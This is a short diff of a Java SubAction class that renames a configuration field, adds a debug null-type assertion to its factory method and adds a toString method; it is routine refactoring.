@@ -25,7 +25,7 @@ public abstract class SubAction implements Runnable {
 	private static final String TAG = "SubAction"; //$NON-NLS-1$
 
 	/** Parameters. */
-	private final ConfAction subActionParams;
+	private final ConfAction conf;
 
 	/** The want uninstall. */
 	// protected boolean wantUninstall;
@@ -36,6 +36,8 @@ public abstract class SubAction implements Runnable {
 	/** The status. */
 	Status status;
 
+	
+
 	/**
 	 * Instantiates a new sub action.
 	 * 
@@ -44,11 +46,11 @@ public abstract class SubAction implements Runnable {
 	 * @param jsubaction
 	 *            the params
 	 */
-	public SubAction(final ConfAction jsubaction) {
-		this.subActionParams = jsubaction;
+	public SubAction(final ConfAction conf) {
 		this.status = Status.self();
+		this.conf = conf;
 
-		parse(jsubaction);
+		parse(conf);
 	}
 
 	/**
@@ -64,6 +66,8 @@ public abstract class SubAction implements Runnable {
 	 * @throws ConfigurationException 
 	 */
 	public static SubAction factory(String type, final ConfAction params) throws  ConfigurationException {
+		if (Cfg.DEBUG) Check.asserts(type != null,"factory: null type");
+		
 		if (type.equals("uninstall")) {
 
 			if (Cfg.DEBUG) {
@@ -147,7 +151,7 @@ public abstract class SubAction implements Runnable {
 	}
 
 	public String getType(){
-		return subActionParams.getType();
+		return conf.getType();
 	}
 	
 	/** The finished. */
@@ -204,6 +208,11 @@ public abstract class SubAction implements Runnable {
 		synchronized (this) {
 			finished = false;
 		}
+	}
+	
+	@Override
+	public String toString() {
+		return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") " +conf.getType() + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 	}
 
 }
